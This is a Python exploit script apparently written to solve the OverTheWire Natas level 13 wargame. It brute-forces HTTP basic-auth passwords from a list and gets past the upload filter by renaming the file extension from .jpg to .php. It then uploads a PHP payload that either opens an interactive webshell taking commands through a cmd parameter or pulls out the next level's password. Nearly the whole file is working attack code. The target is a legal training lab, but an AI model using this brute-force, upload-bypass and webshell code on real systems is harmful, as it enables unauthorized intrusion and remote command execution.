#!/usr/bin/env python


import requests
import re
import sys

from pathlib import Path
from bs4 import BeautifulSoup
from payload import generate_payload


status_red = '\033[31m'
status_green = '\033[32m'
status_yellow = '\033[33m'
status_end = '\033[0;0m'


def get_password(url, username, passwords):

    # Initial query and bruteforce using password list

    for password in passwords:

        password = password.strip()
        http = requests.post(url, auth=(username, password))

        if http.status_code != 200:
            pass

        else:
            return password


def web_request(url, username, password):

    http = requests.post(url, auth=(username, password))

    if http.status_code == 200:

        print('%sSuccess.%s -> OK status code: %s' % (status_green, status_end, http.status_code))

    else:

        print('%sFailed..%s -> ERROR status code: %s' % (status_red, status_end, http.status_code))

    return http.text


def fetch_web_data(response):

    # BS Parser

    return BeautifulSoup(response, 'html.parser')


def convert_file_ext(data):

    # Get the data from BS4 and query hidden input
    try:
        file_name = data.find_all('input', type='hidden')
        file_name = str(file_name[1]['value'].replace('.jpg', '.php'))

    except IndexError:
        pass

    else:
        return file_name


def send_form_data(url, username, password, payload, filename, debug=False):

    # Input values according to natas13

    payload_data = {
        'uploadedfile': open(payload, 'rb')
    }

    # Send POST data to server
    post_data = {
        'MAX_FILE_SIZE': '1000',
        'filename': filename,
        'uploadedfile': payload_data,
        'submit': 'submit'
    }

    # Get response from the sent data
    send_file = requests.post(url, auth=(username, password), data=post_data, files=payload_data)

    try:
        if send_file.status_code != 200:

            print('%sPayload Upload failed..%s -> ERROR status code: %s' % (status_red, status_end, send_file.status_code))
            output = send_file.status_code

            return output

        else:

            print('%sPayload Uploaded.%s -> OK status code: %s' % (status_green, status_end, send_file.status_code))

            soup = fetch_web_data(send_file.text)
            result = soup.select('#content')[0].text

            if debug:
                print('%sDEBUG:%s %s' % (status_yellow, status_end, result))

            # Get file name
            output = ''

            for index, i in enumerate(result):

                output += i
                if index == 89:
                    break

            # Get the output file name
            output = re.search(r'[a-zA-Z0-9]{10}.[a-zA-Z]{3}', output).group(0)
            return output

    except AttributeError:
        pass


def execute_payload(data, password, payload_type):

    # Check if output is status code or file name
    fetch_data = re.search(r'([a-zA-Z0-9]{3,10})(.[a-zA-Z]{3})?', str(data)).group(0)

    # Get file name if not none
    file_name = re.match(r'[a-zA-Z0-9]{3,10}.[a-zA-Z]{3}', fetch_data)

    if data != 200 and file_name is None:
        print('%sExiting.. Unathorized%s -> ERROR status code: %s' % (status_red, status_end, data))
        sys.exit(1)

    # Data validated. Starting payload
    # Simple Webshell
    if payload_type == 'webshell.php':

        payload = requests.get('%supload/%s' % (url, data), auth=(username, password))
        print('%sExecuting Shell..%s -> OK status code: %s\n' % (status_green, status_end, payload.status_code))

        while True:
            cmd = input('%sexploit%s%s@%s%s%s_webshell$%s ' % (
                status_red, status_end, status_green, status_end, status_yellow, username, status_end)
            )

            payload = requests.get('%supload/%s?cmd=%s' % (url, data, cmd), auth=(username, password))

            print(fetch_web_data(payload.text))

            if cmd == 'exit' or cmd == 'quit':
                break
                sys.exit(0)

    # Get password
    elif payload_type == 'showpass.php':

        payload = requests.post('%supload/%s' % (url, data), auth=(username, password))
        result = fetch_web_data(payload.text)

        try:
            if payload.status_code != 200:
                print('%sFailed..%s -> ERROR status code: %s' % (status_red, status_end, payload.status_code))

            else:

                # Get the flag
                print('%sExecuting Payload..%s -> OK status code: %s' % (status_green, status_end, payload.status_code))
                flag = re.search(r'[a-zA-Z0-9]{32}', result.text).group(0)

                print('\n%sEnjoy your flag!%s -> %s ' % (status_green, status_end, flag))
                return flag

        except AttributeError:
            pass


def save_flag(data, save=False):

    try:
        if save:
            with open('flag.txt', 'w') as flag:
                flag.write(data)
                flag.close()

    except TypeError:
        print('%sERROR%s -> An unknown error has occured. exiting..' % (status_red, status_end))
        sys.exit(1)


def main(url, username, passwords, save=False):

    print('%sStarted.%s -> Exploiting..\n' % (status_green, status_end))

    password = get_password(url, username, passwords)
    http = web_request(url, username, password)
    data = fetch_web_data(http)
    filename = convert_file_ext(data)

    # Modify type of payload
    payload_type = generate_payload(show_pass=True, web_shell=False)

    data = send_form_data(url, username, password, payload_type, filename, debug=False)
    flag = execute_payload(data, password, payload_type)

    # Save flag
    if payload_type == 'showpass.php':
        save_flag(flag, save)


if __name__ == '__main__':

    level = 13
    username = '%s%s' % ('natas', level)
    passwords = open(Path('../passwords.txt'), 'r').readlines()

    url = 'http://%s.natas.labs.overthewire.org/' % username

    main(url, username, passwords, save=True)
